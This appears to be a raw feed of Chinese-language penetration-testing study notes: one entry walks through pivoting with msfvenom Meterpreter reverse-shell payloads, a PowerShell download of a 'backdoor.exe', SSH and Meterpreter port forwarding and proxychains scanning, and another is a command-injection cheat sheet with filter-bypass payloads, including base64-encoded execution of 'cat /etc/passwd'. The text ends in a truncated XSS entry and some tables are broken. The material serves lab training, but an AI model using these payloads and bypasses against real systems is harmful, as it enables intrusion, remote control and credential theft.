在这些情况下，我们必须找到一个枢轴主机，这是我们的攻击主机和Windows服务器之间的常见连接点。在我们的案例中，我们的中枢主机将是Ubuntu服务器，因为它可以连接到我们的攻击主机和Windows目标。为了在Windows上获得Meterpeter外壳，我们将使用msfvenom创建MeterpeterHTTPS负载，但负载的反向连接配置为Ubuntu服务器的主机IP地址（172.16.5.129）。我们将使用Ubuntu服务器上的端口8080将所有反向数据包转发到攻击主机的8000端口，Metasploit侦听器正在该端口运行。</p><h4 id="Creating-a-Windows-Payload-with-msfvenom"><a href="#Creating-a-Windows-Payload-with-msfvenom" class="headerlink" title="Creating a Windows Payload with msfvenom"></a>Creating a Windows Payload with msfvenom</h4><pre><code class="shell-session"> msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 8000lport =&gt; 8000msf6 exploit(multi/handler) &gt; run[*] Started HTTPS reverse handler on https://0.0.0.0:8000</code></pre><p>一旦创建了有效负载，并且配置并运行了侦听器，我们就可以使用scp命令将有效负载复制到Ubuntu服务器，因为我们已经有了使用SSH连接到Ubuntu服务器的凭据。</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/backupscript.exe                                   100% 7168    65.4KB/s   00:00 </code></pre><p>复制有效负载后，我们将在复制有效负载的同一目录中的Ubuntu服务器上使用以下命令启动python3HTTP服务器。</p><h4 id="Starting-Python3-Webserver-on-Pivot-Host"><a href="#Starting-Python3-Webserver-on-Pivot-Host" class="headerlink" title="Starting Python3 Webserver on Pivot Host"></a>Starting Python3 Webserver on Pivot Host</h4><pre><code class="shell-session">ubuntu@Webserver$ python3 -m http.server 8123</code></pre><h4 id="Downloading-Payload-from-Windows-Target"><a href="#Downloading-Payload-from-Windows-Target" class="headerlink" title="Downloading Payload from Windows Target"></a>Downloading Payload from Windows Target</h4><p>我们可以通过web浏览器或PowerShell cmdlet Invoke-WebRequest从Windows主机下载此备份脚本.exe。</p><pre><code class="powershell-session">PS C:\Windows\system32&gt; Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></pre><p>一旦我们在Windows主机上下载了负载，我们将使用SSH远程端口转发将msfconsole在8000端口上的侦听器服务转发到Ubuntu服务器的8080端口。我们将在SSH命令中使用-vN参数，使其变得详细，并要求它不要提示登录shell。-R命令要求Ubuntu服务器侦听<targetIPaddress>:8080，并将端口8080上的所有传入连接转发到我们攻击主机0.0.0.0:8000上的msfconsole侦听器。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></pre><p>在创建SSH远程端口转发后，我们可以从Windows目标执行负载。如果有效负载按预期执行并尝试连接回侦听器，我们可以在pivot主机上看到来自pivot的日志。</p><p>如果一切设置正确，我们将通过Ubuntu服务器收到一个Meterpeter shell。</p><h4 id="Meterpreter-Session-Established"><a href="#Meterpreter-Session-Established" class="headerlink" title="Meterpreter Session Established"></a>Meterpreter Session Established</h4><pre><code class="shell-session">[*] Started HTTPS reverse handler on https://0.0.0.0:8000[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] Meterpreter session 1 opened (127.0.0.1:8000 -&gt; 127.0.0.1 ) at 2022-03-02 10:48:10 -0500meterpreter &gt; shellProcess 3236 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre><p>Meterpeter会话应该列出我们的传入连接来自本地主机本身（127.0.0.1），因为我们通过本地SSH套接字接收连接，该套接字创建了到Ubuntu服务器的出站连接。发出netstat命令可以向我们显示传入连接来自SSH服务。 下面的图形表示提供了理解该技术的另一种方式。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291516188.png" alt="img"></p><pre><code class="powershell-session"> Invoke-WebRequest -Uri &quot;http://10.129.147.31:8123/backdoor.exe&quot; -OutFile &quot;C:\backdoor&quot;</code></pre><h1 id="Meterpreter-Tunneling-amp-Port-Forwarding"><a href="#Meterpreter-Tunneling-amp-Port-Forwarding" class="headerlink" title="Meterpreter Tunneling &amp; Port Forwarding"></a>Meterpreter Tunneling &amp; Port Forwarding</h1><h4 id="Creating-Payload-for-Ubuntu-Pivot-Host"><a href="#Creating-Payload-for-Ubuntu-Pivot-Host" class="headerlink" title="Creating Payload for Ubuntu Pivot Host"></a>Creating Payload for Ubuntu Pivot Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</code></pre><p>在复制有效负载之前，我们可以启动一个 <a href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi&#x2F;handler</a>，也称为GenericPayloadHandler。</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler</code></pre><p>我们可以通过SSH将备份作业二进制文件复制到Ubuntu pivot主机，并执行它以获得Meterpeter会话。</p><p>我们需要确保在执行有效载荷时成功建立MeterMeter会话。</p><h4 id="Meterpreter-Session-Establishment"><a href="#Meterpreter-Session-Establishment" class="headerlink" title="Meterpreter Session Establishment"></a>Meterpreter Session Establishment</h4><p>我们知道Windows目标位于172.16.5.0&#x2F;23网络上。因此，假设Windows目标上的防火墙允许ICMP请求，我们希望在此网络上执行ping扫描。我们可以使用带有ping_sweep模块的Meterpeter来实现这一点，该模块将生成从Ubuntu主机到网络的ICMP流量172.16.5.0&#x2F;23。</p><h4 id="Ping-Sweep"><a href="#Ping-Sweep" class="headerlink" title="Ping Sweep"></a>Ping Sweep</h4><pre><code class="shell-session">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23[*] Performing ping sweep for IP range 172.16.5.0/23</code></pre><p>我们还可以直接在目标枢轴主机上使用for循环执行ping扫描，该主机将ping我们指定的网络范围内的任何设备。这里有两个有用的ping扫描循环一行，我们可以用于基于Linux和基于Windows的枢轴主机。</p><pre><code class="shell-session">for i in &#123;1..254&#125; ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done</code></pre><pre><code class="cmd-session">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</code></pre><pre><code class="powershell-session">1..254 | % &#123;&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;&#125;</code></pre><p>注意：ping扫描可能不会在第一次尝试时成功回复，尤其是在跨网络通信时。这可能是由主机构建其arp缓存所需的时间造成的。在这些情况下，最好尝试至少两次ping扫描，以确保构建arp缓存。</p><p>在某些情况下，主机的防火墙会阻止ping（ICMP），而ping不会成功回复我们。在这些情况下，我们可以使用Nmap在172.16.5.0&#x2F;23网络上执行TCP扫描。我们还可以使用Metasploit的漏洞利用后路由模块socks_proxy在攻击主机上配置本地代理，而不是使用SSH进行端口转发。我们将为SOCKS版本4a配置SOCKS代理。此SOCKS配置将在端口9050上启动一个侦听器，并路由通过MeterMeter会话接收的所有流量。</p><h4 id="Configuring-MSF’s-SOCKS-Proxy"><a href="#Configuring-MSF’s-SOCKS-Proxy" class="headerlink" title="Configuring MSF’s SOCKS Proxy"></a>Configuring MSF’s SOCKS Proxy</h4><pre><code class="shell-session">msf6 &gt; use auxiliary/server/socks_proxy</code></pre><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050SRVPORT =&gt; 9050msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0SRVHOST =&gt; 0.0.0.0msf6 auxiliary(server/socks_proxy) &gt; set version 4aversion =&gt; 4amsf6 auxiliary(server/socks_proxy) &gt; run[*] Auxiliary module running as background job 0.[*] Starting the SOCKS proxy servermsf6 auxiliary(server/socks_proxy) &gt; optionsModule options (auxiliary/server/socks_proxy):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SRVHOST  0.0.0.0          yes       The address to listen on   SRVPORT  9050             yes       The port to listen on   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,                                        5)Auxiliary action:   Name   Description   ----   -----------   Proxy  Run a SOCKS proxy server</code></pre><h4 id="Confirming-Proxy-Server-is-Running"><a href="#Confirming-Proxy-Server-is-Running" class="headerlink" title="Confirming Proxy Server is Running"></a>Confirming Proxy Server is Running</h4><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; jobsJobs====  Id  Name                           Payload  Payload opts  --  ----                           -------  ------------  0   Auxiliary: server/socks_proxy</code></pre><p>在启动SOCKS服务器后，我们将配置proxychans，通过我们在受损的Ubuntu主机上的枢轴来路由其他工具（如Nmap）生成的流量。如果还没有，我们可以在&#x2F;etc&#x2F;proxychain.conf的proxychain.onf文件的末尾添加以下行。</p><pre><code class="shell-session">socks4 127.0.0.1 9050</code></pre><p>注意：根据SOCKS服务器运行的版本，我们可能偶尔需要在proxyains.conf中将socks4更改为socks5。</p><h4 id="Creating-Routes-with-AutoRoute"><a href="#Creating-Routes-with-AutoRoute" class="headerlink" title="Creating Routes with AutoRoute"></a>Creating Routes with AutoRoute</h4><pre><code class="shell-session">msf6 &gt; use post/multi/manage/autoroutemsf6 post(multi/manage/autoroute) &gt; set SESSION 1SESSION =&gt; 1msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0SUBNET =&gt; 172.16.5.0msf6 post(multi/manage/autoroute) &gt; run</code></pre><p>也可以通过从MeterMeter会话运行自动路由来添加具有自动路由的路由。</p><pre><code class="shell-session">meterpreter &gt; run autoroute -s 172.16.5.0/23</code></pre><p>添加必要的路由后，我们可以使用-p选项列出活动路由，以确保我们的配置按预期应用。</p><pre><code class="shell-session">meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Active Routing Table====================   Subnet             Netmask            Gateway   ------             -------            -------   10.129.0.0         255.255.0.0        Session 1   172.16.4.0         255.255.254.0      Session 1   172.16.5.0         255.255.254.0      Session 1</code></pre><p>从上面的输出中可以看出，该路由已添加到172.16.5.0&#x2F;23网络中。我们现在可以使用proxychans通过MeterMeter会话路由我们的Nmap流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</code></pre><h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>端口转发也可以使用Meterpeter的portfwd模块来完成。我们可以在我们的攻击主机上启用侦听器，并请求Meterpeter通过Metermeter会话将在该端口上接收到的所有数据包转发到172.16.5.0&#x2F;23网络上的远程主机。</p><pre><code class="shell-session">meterpreter &gt; help portfwdUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS:</code></pre><h4 id="Creating-Local-TCP-Relay"><a href="#Creating-Local-TCP-Relay" class="headerlink" title="Creating Local TCP Relay"></a>Creating Local TCP Relay</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19</code></pre><p>上述命令请求Metereter会话在我们的攻击主机的本地端口（-l）3300上启动一个侦听器，并通过我们的Meter会话将所有数据包转发到3389端口（-p）上的远程（-r）Windows服务器172.16.5.19。现在，如果我们在localhost:3300上执行xfreerdp，我们将能够创建一个远程桌面会话。</p><h4 id="Connecting-to-Windows-Target-through-localhost"><a href="#Connecting-to-Windows-Target-through-localhost" class="headerlink" title="Connecting to Windows Target through localhost"></a>Connecting to Windows Target through localhost</h4><pre><code class="shell-session">Tanin@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></pre><h4 id="Netstat-Output"><a href="#Netstat-Output" class="headerlink" title="Netstat Output"></a>Netstat Output</h4><p>我们可以使用Netstat来查看有关我们最近建立的会话的信息。从防御的角度来看，如果我们怀疑主机被破坏，我们可能会从使用Netstat中受益。这使我们能够查看主机建立的任何会话。</p><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antptcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp </code></pre><hr><h2 id="Meterpreter-Reverse-Port-Forwarding"><a href="#Meterpreter-Reverse-Port-Forwarding" class="headerlink" title="Meterpreter Reverse Port Forwarding"></a>Meterpreter Reverse Port Forwarding</h2><p>与本地端口转发类似，Metasploit也可以使用以下命令执行反向端口转发，您可能希望监听受损服务器上的特定端口，并将所有来自Ubuntu服务器的shell转发到我们的攻击主机。我们将在Windows攻击主机的新端口上启动一个侦听器，并请求Ubuntu服务器将在端口1234上接收到的所有请求转发到我们在端口8081上的侦听器。 我们可以使用下面的命令在前面的场景中的现有shell上创建反向端口转发。该命令将Ubuntu服务器上运行的1234端口上的所有连接转发到本地端口（-l）8081上的攻击主机。我们还将配置我们的侦听器，以便在Windows外壳的8081端口上侦听。</p><h4 id="Reverse-Port-Forwarding-Rules"><a href="#Reverse-Port-Forwarding-Rules" class="headerlink" title="Reverse Port Forwarding Rules"></a>Reverse Port Forwarding Rules</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234</code></pre><h4 id="Configuring-amp-Starting-multi-x2F-handler"><a href="#Configuring-amp-Starting-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting multi&#x2F;handler"></a>Configuring &amp; Starting multi&#x2F;handler</h4><pre><code class="shell-session">meterpreter &gt; bg[*] Backgrounding session 1...msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LPORT 8081 LPORT =&gt; 8081msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 LHOST =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 0.0.0.0:8081 </code></pre><p>我们现在可以创建一个反向shell负载，当在Windows主机上执行时，该负载将在172.16.5.129:1234上将连接发送回我们的Ubuntu服务器。一旦我们的Ubuntu服务器接收到这个连接，它就会转发这个连接来攻击我们配置的主机的ip:8081。</p><h4 id="Establishing-the-Meterpreter-session"><a href="#Establishing-the-Meterpreter-session" class="headerlink" title="Establishing the Meterpreter session"></a>Establishing the Meterpreter session</h4><pre><code class="shell-session">[*] Started reverse TCP handler on 0.0.0.0:8081 [*] Sending stage (200262 bytes) to 10.10.14.18[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500meterpreter &gt; shellProcess 2336 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>command injections</title>
      <link href="/2023/08/24/command-injections/"/>
      <url>/2023/08/24/command-injections/</url>
      
        <content type="html"><![CDATA[<p>检测基本操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们试图通过各种注入方法附加我们的命令。如果命令输出与预期的通常结果不同，则我们已成功利用该漏洞。对于更高级的命令注入漏洞，情况可能并非如此，因为我们可能会利用各种模糊方法或代码审查来识别潜在的命令注入弱点。然后，我们可以逐步构建我们的有效载荷，直到我们实现命令注入。</p><span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Filtered-Character-Bypass"><a href="#Filtered-Character-Bypass" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>printenv</code></td><td>Can be used to view all environment variables</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>$&#123;IFS&#125;</code></td><td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td></tr><tr><td><code>&#123;ls,-la&#125;</code></td><td>Commas will be replaced with spaces</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>$&#123;PATH:0:1&#125;</code></td><td>Will be replaced with <code>/</code></td></tr><tr><td><code>$&#123;LS_COLORS:10:1&#125;</code></td><td>Will be replaced with <code>;</code></td></tr><tr><td><code>$(tr &#39;!-&#125;&#39; &#39;&quot;-~&#39;&lt;&lt;&lt;[)</code></td><td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass"><a href="#Blacklisted-Command-Bypass" class="headerlink" title="Blacklisted Command Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>$@</code> or <code>\</code></td><td>Linux only</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)</code></td><td>Execute command regardless of cases</td></tr><tr><td><code>$(a=&quot;WhOaMi&quot;;printf %s &quot;$&#123;a,,&#125;&quot;)</code></td><td>Another variation of the technique</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td>&#96;echo ‘whoami’</td><td>rev&#96;</td></tr><tr><td><code>$(rev&lt;&lt;&lt;&#39;imaohw&#39;)</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td>&#96;echo -n ‘cat &#x2F;etc&#x2F;passwd</td><td>grep 33’</td></tr><tr><td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td><td>Execute b64 encoded string</td></tr></tbody></table><hr><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="Filtered-Character-Bypass-1"><a href="#Filtered-Character-Bypass-1" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ChildItem Env:</code></td><td>Can be used to view all environment variables - (PowerShell)</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>%PROGRAMFILES:~10,-5%</code></td><td>Will be replaced with a space - (CMD)</td></tr><tr><td><code>$env:PROGRAMFILES[10]</code></td><td>Will be replaced with a space - (PowerShell)</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>%HOMEPATH:~0,-17%</code></td><td>Will be replaced with <code>\</code> - (CMD)</td></tr><tr><td><code>$env:HOMEPATH[0]</code></td><td>Will be replaced with <code>\</code> - (PowerShell)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass-1"><a href="#Blacklisted-Command-Bypass-1" class="headerlink" title="Blacklisted Command Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>^</code></td><td>Windows only (CMD)</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>WhoAmi</code></td><td>Simply send the character with odd cases</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td><code>&quot;whoami&quot;[-1..-20] -join &#39;&#39;</code></td><td>Reverse a string</td></tr><tr><td><code>iex &quot;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&quot;</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))</code></td><td>Encode a string with base64</td></tr><tr><td><code>iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&quot;</code></td><td>Execute b64 encoded string</td></tr></tbody></table><h2 id="Command-Injection-Methods"><a href="#Command-Injection-Methods" class="headerlink" title="Command Injection Methods"></a>Command Injection Methods</h2><p>要将附加命令注入到预期命令中，我们可以使用以下任何运算符：</p><table><thead><tr><th><strong>Injection Operator</strong></th><th><strong>Injection Character</strong></th><th><strong>URL-Encoded Character</strong></th><th><strong>Executed Command</strong></th></tr></thead><tbody><tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr><tr><td>New Line</td><td><code>\n</code></td><td><code>%0a</code></td><td>Both</td></tr><tr><td>Background</td><td><code>&amp;</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td>&#96;</td><td>&#96;</td><td><code>%7c</code></td></tr><tr><td>AND</td><td><code>&amp;&amp;</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td>&#96;</td><td></td><td>&#96;</td></tr><tr><td>Sub-Shell</td><td>&#96;&#96;&#96;&#96;</td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr></tbody></table><p>注意：唯一的例外可能是分号；，如果使用Windows命令行（CMD）执行命令，则该命令将不起作用，但如果使用Windows PowerShell执行命令，该命令仍将起作用。</p><table><thead><tr><th><strong>Injection Type</strong></th><th><strong>Operators</strong></th></tr></thead><tbody><tr><td>SQL Injection</td><td><code>&#39;</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Command Injection</td><td><code>;</code> <code>&amp;&amp;</code></td></tr><tr><td>LDAP Injection</td><td><code>*</code> <code>(</code> <code>)</code> <code>&amp;</code> &#96;</td></tr><tr><td>XPath Injection</td><td><code>&#39;</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td></tr><tr><td>OS Command Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>Code Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>$&#123;&#125;</code> <code>#&#123;&#125;</code> <code>%&#123;&#125;</code> <code>^</code></td></tr><tr><td>Directory Traversal&#x2F;File Path Traversal</td><td><code>../</code> <code>..\\</code> <code>%00</code></td></tr><tr><td>Object Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>XQuery Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Shellcode Injection</td><td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td></tr><tr><td>Header Injection</td><td><code>\n</code> <code>\r\n</code> <code>\t</code> <code>%0d</code> <code>%0a</code> <code>%09</code></td></tr></tbody></table><h2 id="Blacklisted-Characters"><a href="#Blacklisted-Characters" class="headerlink" title="Blacklisted Characters"></a>Blacklisted Characters</h2><p>web应用程序可能有一个列入黑名单的字符列表，如果命令中包含这些字符，它将拒绝请求。PHP代码可能如下所示：</p><pre><code class="php">$blacklist = [&#39;&amp;&#39;, &#39;|&#39;, &#39;;&#39;, ...SNIP...];foreach ($blacklist as $character) &#123;    if (strpos($_POST[&#39;ip&#39;], $character) !== false) &#123;        echo &quot;Invalid input&quot;;    &#125;&#125;</code></pre><h2 id="Identifying-Blacklisted-Character"><a href="#Identifying-Blacklisted-Character" class="headerlink" title="Identifying Blacklisted Character"></a>Identifying Blacklisted Character</h2><p>我们将请求减少到一次一个字符，看看它何时被阻止。</p><h2 id="Bypass-Blacklisted-Spaces"><a href="#Bypass-Blacklisted-Spaces" class="headerlink" title="Bypass Blacklisted Spaces"></a>Bypass Blacklisted Spaces</h2><p>我们会看到，大多数注射经营者确实被列入黑名单。但是，换行符通常不会被列入黑名单，因为有效负载本身可能需要它。我们知道，在Linux和Windows中，换行符都可以用于附加命令，所以让我们尝试将其用作注入运算符：</p><h4 id="Using-Tabs"><a href="#Using-Tabs" class="headerlink" title="Using Tabs"></a>Using Tabs</h4><p>使用制表符（%09）而不是空格是一种可行的技术，因为Linux和Windows都接受参数之间带有制表符的命令，并且它们的执行方式相同</p><ul><li><code>%0a</code>：这表示 ASCII 值为 10 的字符，它是换行符（Line Feed，LF）的 ASCII 值。</li><li><code>%09</code>：这表示 ASCII 值为 9 的字符，它是水平制表符（Tab）的 ASCII 值。</li></ul><h4 id="Using-IFS"><a href="#Using-IFS" class="headerlink" title="Using $IFS"></a>Using $IFS</h4><p>使用（$IFS）Linux环境变量也可以工作，因为它的默认值是一个空格和一个选项卡，可以在命令参数之间工作。因此，如果我们在空格所在的位置使用${IFS}，则变量应自动替换为空格，并且我们的命令应该有效。</p><blockquote><p><code>$IFS</code> 是一个环境变量，在 Unix 和类 Unix 操作系统中使用。它代表 “Internal Field Separator”（内部字段分隔符），用于定义用于分隔字符的字符串。</p></blockquote><h4 id="Using-Brace-Expansion"><a href="#Using-Brace-Expansion" class="headerlink" title="Using Brace Expansion"></a>Using Brace Expansion</h4><p>还有许多其他方法可以用来绕过空间过滤器。例如，我们可以使用Bash-Brace Expansion功能，该功能会自动在大括号之间的参数之间添加空格，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ &#123;ls,-la&#125;</code></pre><h1 id="Bypassing-Other-Blacklisted-Characters"><a href="#Bypassing-Other-Blacklisted-Characters" class="headerlink" title="Bypassing Other Blacklisted Characters"></a>Bypassing Other Blacklisted Characters</h1><p>除了注入运算符和空格字符外，一个非常常见的黑名单字符是斜杠（&#x2F;）或反斜杠（\）字符，因为在Linux或Windows中指定目录是必要的。我们可以使用多种技术来生成我们想要的任何字符，同时避免使用列入黑名单的字符。</p><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>我们可以利用许多技术在有效载荷中设置斜线。我们可以用来替换斜杠（或任何其他字符）的一种技术是通过&#x3D;&#x3D;Linux环境变量&#x3D;&#x3D;，就像我们对${IFS}所做的那样。虽然${IFS}被直接替换为空格，但斜杠或分号没有这样的环境变量。然而，这些字符可以在环境变量中使用，并且我们可以指定字符串的开始和长度来完全匹配这个字符。 例如，如果我们查看Linux中的$PATH环境变量，它可能如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH&#125;/usr/local/bin:/usr/bin:/bin:/usr/games</code></pre><p>因此，如果我们从0字符开始，并且只使用长度为1的字符串，那么我们将只使用&#x2F;字符，我们可以在有效载荷中使用：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH:0:1&#125;/</code></pre><blockquote><p>参数扩展语法是 Shell 编程中一种用于操作和处理变量值的特殊语法。它允许你从变量值中提取子字符串、执行替换操作、计算长度等等。参数扩展可以用于在脚本中处理字符串、变量和命令的输出。</p><p>在大多数 Unix-like Shell（如 Bash、Zsh、sh 等）中，有几种常用的参数扩展形式：</p><ol><li><code>$&#123;variable&#125;</code>：用于引用变量的值。例如，<code>$&#123;PATH&#125;</code> 表示引用 <code>PATH</code> 变量的值。</li><li><code>$&#123;variable:-default&#125;</code>：如果变量未定义或为空，则使用默认值。例如，<code>$&#123;USERNAME:-guest&#125;</code> 表示如果 <code>USERNAME</code> 变量未定义或为空，使用默认值 “guest”。</li><li><code>$&#123;variable:=default&#125;</code>：如果变量未定义或为空，则将其设置为默认值。例如，<code>$&#123;EDITOR:=nano&#125;</code> 表示如果 <code>EDITOR</code> 变量未定义或为空，设置为 “nano”。</li><li><code>$&#123;variable:offset:length&#125;</code>：从变量值中提取子字符串。例如，<code>$&#123;NAME:0:3&#125;</code> 表示从 <code>NAME</code> 变量的值中提取前三个字符。</li><li><code>$&#123;variable#pattern&#125;</code> 和 <code>$&#123;variable##pattern&#125;</code>：从变量值的开头移除匹配的模式。<code>#</code> 会移除最短匹配，<code>##</code> 会移除最长匹配。</li><li><code>$&#123;variable%pattern&#125;</code> 和 <code>$&#123;variable%%pattern&#125;</code>：从变量值的末尾移除匹配的模式。<code>%</code> 会移除最短匹配，<code>%%</code> 会移除最长匹配。</li><li>&#96;$</li></ol></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/08/15/XSS/"/>
      <url>/2023/08/15/XSS/</url>
      
